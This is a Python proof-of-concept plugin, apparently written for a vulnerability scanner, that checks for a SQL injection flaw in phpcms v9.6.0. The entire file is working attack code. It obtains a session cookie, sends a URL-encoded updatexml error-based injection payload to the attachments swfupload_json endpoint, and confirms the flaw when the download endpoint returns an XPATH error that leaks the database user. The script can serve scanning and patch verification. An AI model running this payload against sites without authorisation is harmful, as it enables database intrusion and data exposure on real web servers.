# Author:w8ay
# Name:测试DEMO
'''
name: phpcms v9.6.0 SQL注入
referer: https://zhuanlan.zhihu.com/p/26263513
author: Lucifer
description: 过滤函数不严谨造成的过滤绕过。
'''

import HackRequests
import re


def poc(arg, **kwargs):
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
    }
    url_preffix = arg + "/index.php?m=wap&c=index&a=init&siteid=1"
    hack = HackRequests.hackRequests()
    hh = hack.http(url_preffix)
    tmp_cookie = False
    if hh.cookies:
        tmp_cookie = list(hh.cookies.values())[-1]
    if not tmp_cookie:
        return False
    post_data = {
        "userid_flash": tmp_cookie
    }
    payload = "/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26id=%*27%20and%20updatexml%281%2Cconcat%281%2C%28user%28%29%29%29%2C1%29%23%26m%3D1%26f%3Dhaha%26modelid%3D2%26catid%3D7%26"

    vulnurl = arg + payload
    req2 = hack.http(vulnurl, post=post_data, headers=headers, timeout=10, verify=False)

    att_json = list(req2.cookies.values())[-1]
    vulnurl = arg + "/index.php?m=content&c=down&a_k=" + str(att_json)

    req3 = hack.http(vulnurl, headers=headers, timeout=10)
    if "XPATH syntax error" in req3.text():
        result = {
            "name": "PHPCMS sql_inject",  # 插件名称
            "content": "存在phpcms v9.6.0 SQL注入漏洞",  # 插件返回内容详情，会造成什么后果。
            "url": arg,  # 漏洞存在url
            "log": req3.log,
            "tag": "sql_inject"  # 漏洞标签
        }
        return result


if __name__ == "__main__":
    pass